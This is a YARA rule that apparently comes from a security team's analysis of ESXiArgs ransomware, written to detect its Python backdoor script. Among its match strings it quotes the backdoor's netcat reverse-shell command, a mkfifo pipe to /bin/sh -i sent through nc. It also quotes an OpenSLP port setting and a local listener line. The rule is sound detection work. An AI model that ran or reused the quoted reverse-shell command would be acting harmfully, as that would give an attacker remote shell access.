rule RANSOM_ESXiArgs_Ransomware_Python_Feb23
{
	meta:
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		description = "Detects the ESXiArgs Ransomware encryption bash script"
		reference = "https://secuinfra.com/en/techtalk/hide-your-hypervisor-analysis-of-esxiargs-ransomware"
		date = "2023-02-07"
		tlp = "CLEAR"

	strings:
        	$python = "#!/bin/python"
        	$desc = "This module starts debug tools"

        	$command0 = "server_namespace"
        	$command1 = "service_instance"
        	$command2 = "local"
        	$command3 = "operation_id"
        	$command4 = "envelope"

        	$cmd = "'mkfifo /tmp/tmpy_8th_nb; cat /tmp/tmpy_8th_nb | /bin/sh -i 2>&1 | nc %s %s > /tmp/tmpy_8th_nb' % (host, port)"
        	$OpenSLPPort = "port = '427'"
        	$listener = "HTTPServer(('127.0.0.1', 8008), PostServer).serve_forever()"

	condition:
		$python
        	and $desc
        	and 4 of ($command*)
        	and $cmd
        	and $OpenSLPPort
        	and $listener
}
